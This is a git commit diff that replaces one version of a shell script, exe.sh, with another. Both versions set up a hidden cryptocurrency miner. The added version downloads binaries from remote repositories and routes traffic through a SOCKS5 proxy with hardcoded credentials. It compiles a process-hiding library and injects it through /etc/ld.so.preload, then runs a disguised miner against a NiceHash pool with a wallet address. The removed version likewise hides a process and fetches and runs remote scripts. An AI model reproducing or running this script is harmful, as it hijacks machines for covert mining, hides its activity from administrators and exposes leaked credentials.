b01b14a88f499c970f698599adbb7957c245dc7a
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-03-02 13:43:48 +0000

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,12 +1,48 @@
-#!/bin/sh
-sudo apt update -y
-sudo apt install screen -y
-apt install proxychains
-sed -i 's/socks4/socks5/' /etc/proxychains.conf
-sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-sed -i 's/9050/10663/' /etc/proxychains.conf
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add mantapu
-wget https://github.com/d-crypto99/xroc3/raw/main/mantapu
-wget https://raw.githubusercontent.com/d-crypto99/xroc3/main/gpu-nvidia.sh
-chmod +x gpu-nvidia.sh
-./gpu-nvidia.sh
+#!/bin/sh 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
+dpkg-reconfigure --frontend noninteractive tzdata 
+ 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl 
+ 
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
+ 
+tar -xvzf graphics.tar.gz 
+ 
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+socks5 = 52.15.235.202:1080 
+socks5_username = mikrotik999 
+socks5_password = Elibawnos 
+END 
+ 
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
+ 
+sleep .2 
+ 
+echo " " 
+echo " " 
+ 
+echo "**" 
+ 
+./graftcp/graftcp curl ifconfig.me 
+ 
+echo " " 
+echo " " 
+ 
+echo "**" 
+ 
+echo " " 
+echo " " 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
+chmod +x bezzHash 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
+unzip magicBezzHash.zip 
+make 
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
+mv libprocesshider.so /usr/local/lib/ 
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+
+./graftcp/graftcp ./bezzHash --url=ssl://36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
